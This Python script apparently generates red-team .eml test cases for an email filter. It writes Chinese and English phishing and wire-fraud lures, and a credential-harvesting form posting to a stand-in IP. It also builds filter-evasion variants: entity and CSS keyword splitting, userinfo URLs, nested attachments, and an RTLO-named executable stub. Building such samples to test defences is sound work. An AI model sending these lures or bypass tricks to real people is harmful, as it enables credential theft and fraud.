#!/usr/bin/env python3
"""Red-team case generator for the VIGILYX evasion harness.

Writes .eml samples into tests/redteam_cases/. Controls must be flagged;
evasions probe specific bypass vectors identified in the code audit.
"""
import base64
import os
import quopri

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)))

BASE_HEADERS = (
    "From: =?utf-8?B?6YCa6L+H6KGM5oOz? <it-support@partner-external.com>\r\n"
    "To: employee@corp.internal\r\n"
    "Date: Thu, 13 Aug 2026 10:00:00 +0800\r\n"
    "Message-ID: <{mid}@partner-external.com>\r\n"
)

def eml(mid, subject, body_headers, body):
    h = BASE_HEADERS.format(mid=mid)
    h += f"Subject: {subject}\r\n{body_headers}\r\n"
    return (h + body).encode("utf-8")

def write(name, data: bytes):
    with open(os.path.join(OUT, name), "wb") as f:
        f.write(data)
    print("wrote", name, len(data), "bytes")

# ---------------- controls (must be caught) ----------------

PHISH_HTML = (
    "<html><body>"
    "<p>尊敬的用户：系统检测到您的账户存在异常登录，为保障您的资金安全，"
    "请立即点击下方链接验证身份，24小时内未验证将冻结账户。</p>"
    "<p><a href='http://203.0.113.50/verify/login'>http://203.0.113.50/verify/login</a></p>"
    "<p>客服电话 400-123-4567</p>"
    "</body></html>"
)
write("ctrl01_plain_cn_phishing.eml",
      eml("ctrl01", "邮箱安全验证提醒",
          "MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n",
          PHISH_HTML))

bec_text = (
    "Hi,\n\n"
    "I'm in a meeting right now and can't take calls. Our supplier changed their\n"
    "bank account — any payments due must go to the new account below today:\n\n"
    "Beneficiary: Shenzhen Trading Co.\n"
    "Bank: China Merchants Bank\n"
    "Account No.: 6225 8812 3456 7890\n\n"
    "Please process the wire transfer urgently before end of day and confirm by email.\n\n"
    "Regards,\nCEO Office"
)
write("ctrl02_bec_payment_change.eml",
      eml("ctrl02", "Urgent: supplier bank account change - process today",
          "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n",
          bec_text))

# QP soft line-break splitting a keyword's UTF-8 bytes across lines.
qp_body = quopri.encodestring(
    "您的账户存在异常，请立即登录验证：http://203.0.113.50/verify\r\n".encode("utf-8"),
    quotetabs=False)
# force a soft break in the middle of 账 (E8 B4 A6)
raw = "您的账=E8=B4=\r\n=A6户存在异常，请立即登录验证：http://203.0.113.50/verify\r\n"
write("ctrl03_qp_split_keyword.eml",
      eml("ctrl03", "账户异常通知",
          "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n"
          "Content-Transfer-Encoding: quoted-printable\r\n",
          raw))

# ---------------- evasions ----------------

# ev01: CJK keywords broken by &hairsp; named entities (not in the decoder's
# named set; its letters survive into the compact view, still breaking the match)
entity_html = (
    "<html><body>"
    "<p>尊敬的用户：系统检测到您的账&hairsp;户存在异&hairsp;常登录，为保障您的资金安全，"
    "请立&hairsp;即点击下方链接验&hairsp;证身份，24小时内未验证将冻&hairsp;结账户。</p>"
    "<p><a href='https://mail-secure-verify.com/sso/login'>https://mail-secure-verify.com/sso/login</a></p>"
    "</body></html>"
)
write("ev01_entity_hairsp_break.eml",
      eml("ev01", "账号安全提醒",
          "MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n",
          entity_html))

# ev02: same lure, keywords broken by CSS-zero-sized latin letters (invisible
# to the reader, tags stripped to spaces, letters are alphanumeric so the
# compact view keeps them between the keyword chars)
css_html = (
    "<html><head><style>.x{font-size:0;opacity:0}</style></head><body>"
    "<p>尊敬的用户：您的账<span class='x'>x</span>户存在异常，请立即点击链接完成身"
    "<span class='x'>y</span>份验证，否则账户将被冻<span class='x'>z</span>结。</p>"
    "<p><a href='https://mail-secure-verify.com/sso/login'>https://mail-secure-verify.com/sso/login</a></p>"
    "</body></html>"
)
write("ev02_css_hidden_char_break.eml",
      eml("ev02", "账户异常",
          "MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n",
          css_html))

# ev03: traditional-Chinese lure (no traditional keywords expected in a
# simplified-oriented seed)
trad_html = (
    "<html><body>"
    "<p>親愛的用戶：系統偵測到您的帳戶存在異常登入，為保障您的資金安全，"
    "請立即點擊下方連結驗證身分，24小時內未驗證將凍結帳戶。</p>"
    "<p><a href='https://mail-secure-verify.com/sso/login'>https://mail-secure-verify.com/sso/login</a></p>"
    "</body></html>"
)
write("ev03_traditional_chinese.eml",
      eml("ev03", "帳戶安全驗證提醒",
          "MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n",
          trad_html))

# ev04: keywords broken with &hairsp; + lure hosted on a shared trusted
# platform (docs.google.com form) — probes the structural platform bypass
gdocs_html = (
    "<html><body>"
    "<p>您好，人力资&hairsp;源部通知：请通过下方链接完成本年度薪&hairsp;酬信息确认，"
    "逾期未确认将影响工资发放。</p>"
    "<p><a href='https://docs.google.com/forms/d/e/1FAIpQLSfFakeFormId/viewform'>"
    "https://docs.google.com/forms/d/e/1FAIpQLSfFakeFormId/viewform</a></p>"
    "</body></html>"
)
write("ev04_trusted_platform_lure.eml",
      eml("ev04", "薪酬信息确认",
          "MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n",
          gdocs_html))

# ev05: userinfo confusion — anchor shows the corp SSO, href goes to attacker
userinfo_html = (
    "<html><body>"
    "<p>IT 服务中心：您的域密码即将过期，请登录统一认证平台修改密码。</p>"
    "<p><a href='https://sso.corp.internal@attacker-mail.example/login?sso=1'>"
    "https://sso.corp.internal/login</a></p>"
    "</body></html>"
)
write("ev05_userinfo_url.eml",
      eml("ev05", "域密码即将过期",
          "MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n",
          userinfo_html))

# ev06: clean body, phishing page as HTML attachment
phish_attachment = (
    "<html><body style='font-family:sans-serif'>"
    "<h2>企业邮箱安全验证</h2>"
    "<p>您的邮箱账户存在异常，请立即输入密码完成验证，否则账户将被停用。</p>"
    "<form action='http://203.0.113.50/harvest' method='post'>"
    "账号：<input name='u'><br>密码：<input type='password' name='p'><br>"
    "<input type='submit' value='立即验证'></form></body></html>"
)
b64_att = base64.b64encode(phish_attachment.encode("utf-8")).decode()
body = (
    "MIME-Version: 1.0\r\n"
    "Content-Type: multipart/mixed; boundary=\"B1\"\r\n\r\n"
    "--B1\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n"
    "您好，附件是本月的系统通知，请查收。\r\n"
    "--B1\r\n"
    "Content-Type: text/html; name=\"=?utf-8?B?57O7576k6LWe5a6h6Zmi6L+H6YePLmh0bWw=?=\"\r\n"
    "Content-Disposition: attachment; filename=\"=?utf-8?B?57O7576k6LWe5a6h6Zmi6L+H6YePLmh0bWw=?=\"\r\n"
    "Content-Transfer-Encoding: base64\r\n\r\n" + b64_att + "\r\n--B1--\r\n"
)
write("ev06_html_attachment_phish.eml",
      eml("ev06", "系统安全通知", body, ""))

# ev07: dilution — ctrl01 lure buried in 15KB of benign newsletter filler
filler = "".join(
    f"本周行业动态第{i}条：企业数字化转型持续推进，供应链协同效率稳步提升，"
    "绿色低碳与合规治理成为关注重点，相关实践案例详见内刊。\n"
    for i in range(60)
)
dilution_text = (
    "【企业内刊】2026年8月第2期\n\n" + filler + "\n\n"
    "另：系统检测到您的账户存在异常登录，为保障您的资金安全，"
    "请立即点击链接验证：http://203.0.113.50/verify/login（24小时内未验证将冻结账户）\n"
)
write("ev07_dilution.eml",
      eml("ev07", "企业内刊 2026-08 第2期",
          "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n",
          dilution_text))

# ev08: phishing forwarded as message/rfc822 attachment, outer body clean
inner = eml("inner", "=?utf-8?B?56CB5a6D6K+3566h55CG5Zuw6YeP6Zeo6ZSQ5Lqk?=",
            "MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n",
            PHISH_HTML)
inner_b64 = base64.b64encode(inner).decode()
body = (
    "MIME-Version: 1.0\r\n"
    "Content-Type: multipart/mixed; boundary=\"B2\"\r\n\r\n"
    "--B2\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n"
    "FYI，供应商转来的通知，供参考。\r\n"
    "--B2\r\n"
    "Content-Type: message/rfc822; name=\"notice.eml\"\r\n"
    "Content-Disposition: attachment; filename=\"notice.eml\"\r\n"
    "Content-Transfer-Encoding: base64\r\n\r\n" + inner_b64 + "\r\n--B2--\r\n"
)
write("ev08_nested_rfc822.eml",
      eml("ev08", "Fwd: 供应商通知", body, ""))

# ev09: multipart/alternative — clean plain text + phishing HTML
body = (
    "MIME-Version: 1.0\r\n"
    "Content-Type: multipart/alternative; boundary=\"B3\"\r\n\r\n"
    "--B3\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n"
    "您好，最新系统通知请见网页版。\r\n"
    "--B3\r\nContent-Type: text/html; charset=utf-8\r\n\r\n" + PHISH_HTML +
    "\r\n--B3--\r\n"
)
write("ev09_alt_clean_text.eml",
      eml("ev09", "系统通知", body, ""))

# ev10: image-only phishing — no keywords, image + IP button
img_html = (
    "<html><body>"
    "<img src='https://attacker-cdn.example/banner.png' width='600' height='200'>"
    "<a href='http://198.51.100.7/login'><img src='https://attacker-cdn.example/btn.png'"
    " width='200' height='60' alt='登录'></a>"
    "</body></html>"
)
write("ev10_image_only_phish.eml",
      eml("ev10", "邮箱验证",
          "MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n",
          img_html))

# ev11: plain-text social-engineering contact lure (no links, no keywords)
lure_text = (
    "您好，我是财务部王经理。关于本季度供应商付款事宜，邮件里说不方便，\n"
    "请加我微信 138-0013-8000（备注部门+姓名），今天内对接一下付款账户变更，\n"
    "时间紧，先微信确认，不用回复邮件。\n"
)
write("ev11_plain_contact_lure.eml",
      eml("ev11", "付款对接",
          "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n",
          lure_text))

# ev12: RTLO attachment name — "invoice" + U+202E + "gnp.exe" renders as
# "invoicexe.png" style confusion
exe_payload = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff" + b"\x90" * 512
exe_b64 = base64.b64encode(exe_payload).decode()
rtlo_name = "=?utf-8?B?" + base64.b64encode("对账单2026\u202egnp.exe".encode()).decode() + "?="
body = (
    "MIME-Version: 1.0\r\n"
    "Content-Type: multipart/mixed; boundary=\"B4\"\r\n\r\n"
    "--B4\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n"
    "您好，附件为本月对账单，请查收核对。\r\n"
    "--B4\r\n"
    "Content-Type: application/octet-stream\r\n"
    f"Content-Disposition: attachment; filename=\"{rtlo_name}\"\r\n"
    "Content-Transfer-Encoding: base64\r\n\r\n" + exe_b64 + "\r\n--B4--\r\n"
)
write("ev12_rtlo_exe.eml", eml("ev12", "月度对账单", body, ""))

# ev13: English lure with letter-spacing — Latin keywords get no compact pass
eng_html = (
    "<html><body>"
    "<p>D e a r&nbsp; U s e r,&nbsp; y o u r&nbsp; m a i l b o x&nbsp; a c c o u n t&nbsp;"
    "w i l l&nbsp; b e&nbsp; d i s a b l e d .&nbsp; T o&nbsp; k e e p&nbsp; a c c e s s ,"
    "&nbsp; v e r i f y&nbsp; y o u r&nbsp; a c c o u n t&nbsp; n o w :</p>"
    "<p><a href='https://mail-secure-verify.com/sso/login'>https://mail-secure-verify.com/sso/login</a></p>"
    "</body></html>"
)
write("ev13_english_spaced.eml",
      eml("ev13", "Mailbox verification required",
          "MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n",
          eng_html))

print("all cases written")
